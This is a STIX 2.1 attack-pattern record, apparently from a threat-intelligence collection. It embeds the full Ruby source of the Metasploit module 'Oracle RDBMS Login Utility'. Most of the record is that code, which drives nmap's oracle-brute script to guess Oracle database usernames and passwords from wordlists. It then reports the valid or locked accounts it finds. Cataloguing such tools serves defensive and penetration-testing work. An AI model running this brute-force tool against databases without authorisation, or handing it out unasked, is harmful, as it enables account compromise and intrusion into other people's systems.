{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1435727a-2bc9-4ed4-82ce-3702b0f8595d",
    "created": "2024-08-14T16:27:56.005484Z",
    "modified": "2024-08-14T16:27:56.005488Z",
    "name": "Oracle RDBMS Login Utility",
    "description": " This module attempts to authenticate against an Oracle RDBMS instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.  Due to a bug in nmap versions 6.50-7.80 may not work. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/oracle_login.rb",
            "external_id": "oracle_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.oracle.com/database/"
        },
        {
            "source_name": "reference",
            "url": "https://nmap.org/nsedoc/scripts/oracle-brute.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Nmap\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  # Creates an instance of this module.\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle RDBMS Login Utility',\n      'Description'    => %q{\n        This module attempts to authenticate against an Oracle RDBMS\n        instance using username and password combinations indicated\n        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.\n\n        Due to a bug in nmap versions 6.50-7.80 may not work.\n      },\n      'Author'         => [\n        'Patrik Karlsson <patrik[at]cqure.net>', # the nmap NSE script, oracle-brute.nse\n        'todb' # this Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.oracle.com/database/' ],\n          [ 'CVE', '1999-0502'], # Weak password CVE\n          [ 'URL', 'https://nmap.org/nsedoc/scripts/oracle-brute.html']\n        ]\n    ))\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing (space-separated) users and passwords, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"oracle_default_userpass.txt\") ]),\n        OptString.new('SID', [ true, 'The instance (SID) to authenticate against', 'XE'])\n      ])\n\n  end\n\n  def minimum_nmap_version\n    \"5.50\"\n  end\n\n  def run\n    unless nmap_version_at_least? minimum_nmap_version\n      print_error \"Installed Nmap version is not at least #{minimum_nmap_version}. Exiting...\"\n      return false\n    end\n    print_status \"Nmap: Setting up credential file...\"\n    credfile = create_credfile\n    cred_count = 0\n    each_user_pass(true) {|user, pass| credfile[0].puts \"%s/%s\" % [user,pass]; cred_count += 1 }\n    credfile[0].flush\n    nmap_build_args(credfile[1])\n    print_status \"Nmap: Starting Oracle bruteforce with #{cred_count} credentials against SID '#{sid}'...\"\n    nmap_run\n    credfile[0].unlink\n    if Rex::Parser.nokogiri_loaded\n      nmap_hosts {|type,data| process_nokogiri_callback(type,data)}\n    else\n      nmap_hosts {|host| process_host(host)}\n    end\n  end\n\n  def sid\n    datastore['SID'].to_s\n  end\n\n  def nmap_build_args(credpath)\n    nmap_reset_args\n    nmap_append_arg \"-P0\"\n    nmap_append_arg \"--script oracle-brute\"\n    script_args = [\n      \"tns.sid=#{sid}\",\n      \"brute.mode=creds\",\n      \"brute.credfile=#{credpath}\",\n      \"brute.threads=1\"\n    ]\n    script_args << \"brute.delay=#{set_brute_delay}\"\n    nmap_append_arg \"--script-args \\\"#{script_args.join(\",\")}\\\"\"\n    nmap_append_arg \"-n\"\n    nmap_append_arg \"-v\" if datastore['VERBOSE']\n  end\n\n  # Sometimes with weak little 10g XE databases, you will exhaust\n  # available processes from the pool with lots and lots of\n  # auth attempts, so use bruteforce_speed to slow things down\n  def set_brute_delay\n    case datastore[\"BRUTEFORCE_SPEED\"]\n    when 4; 0.25\n    when 3; 0.5\n    when 2; 1\n    when 1; 15\n    when 0; 60 * 5\n    else; 0\n    end\n  end\n\n  def create_credfile\n    outfile = Rex::Quickfile.new(\"msf3-ora-creds-\")\n    if Rex::Compat.is_cygwin and self.nmap_bin =~ /cygdrive/i\n      outfile_path = Rex::Compat.cygwin_to_win32(outfile.path)\n    else\n      outfile_path = outfile.path\n    end\n    @credfile = [outfile,outfile_path]\n  end\n\n  def process_nokogiri_callback(type,data)\n    return unless type == :port_script\n    return unless data[\"id\"] == \"oracle-brute\"\n    return unless data[:addresses].has_key? \"ipv4\"\n    return unless data[:port][\"state\"] == ::Msf::ServiceState::Open\n    addr = data[:addresses][\"ipv4\"].to_s\n    port = data[:port][\"portid\"].to_i\n    output = data[\"output\"]\n    parse_script_output(addr,port,output)\n  end\n\n  def process_host(h)\n    h[\"ports\"].each do |p|\n      next if(h[\"scripts\"].nil? || h[\"scripts\"].empty?)\n      h[\"scripts\"].each do |id,output|\n        next unless id == \"oracle-brute\"\n        parse_script_output(h[\"addr\"],p[\"portid\"],output)\n      end\n    end\n  end\n\n  def extract_creds(str)\n    m = str.match(/\\s+([^\\s]+):([^\\s]+) =>/)\n    m[1,2]\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: opts[:status],\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def parse_script_output(addr,port,output)\n    msg = \"#{addr}:#{port} - Oracle -\"\n    @oracle_reported = false\n    if output =~ /TNS: The listener could not resolve \\x22/n\n      print_error \"#{msg} Invalid SID: #{sid}\"\n    elsif output =~ /Accounts[\\s]+No valid accounts found/nm\n      print_status \"#{msg} No valid accounts found\"\n    else\n      output.each_line do |oline|\n        if oline =~ /Login correct/\n          if not @oracle_reported\n            report_service(:host => addr, :port => port, :proto => \"tcp\", :name => \"oracle\")\n            report_note(:host => addr, :port => port, :proto => \"tcp\", :type => \"oracle.sid\", :data => sid, :update => :unique_data)\n            @oracle_reported = true\n          end\n          user,pass = extract_creds(oline)\n          pass = \"\" if pass == \"<empty>\"\n          print_good \"#{msg} Success: #{user}:#{pass} (SID: #{sid})\"\n          report_cred(\n            ip: addr,\n            port: port,\n            user: \"#{sid}/#{user}\",\n            password: pass,\n            service_name: 'tcp',\n            status: Metasploit::Model::Login::Status::SUCCESSFUL\n          )\n        elsif oline =~ /Account locked/\n          if not @oracle_reported\n            report_service(:host => addr, :port => port, :proto => \"tcp\", :name => \"oracle\")\n            report_note(:host => addr, :port => port, :proto => \"tcp\", :type => \"oracle.sid\", :data => sid, :update => :unique_data)\n            @oracle_reported = true\n          end\n          user = extract_creds(oline)[0]\n          print_good \"#{msg} Locked: #{user} (SID: #{sid}) -- account valid but locked\"\n          report_cred(\n            ip: addr,\n            port: port,\n            user: \"#{sid}/#{user}\",\n            service_name: 'tcp',\n            status: Metasploit::Model::Login::Status::DENIED_ACCESS\n          )\n        elsif oline =~ /^\\s+ERROR: (.*)/\n          print_error \"#{msg} NSE script error: #{$1}\"\n        end\n      end\n    end\n  end\nend\n"
}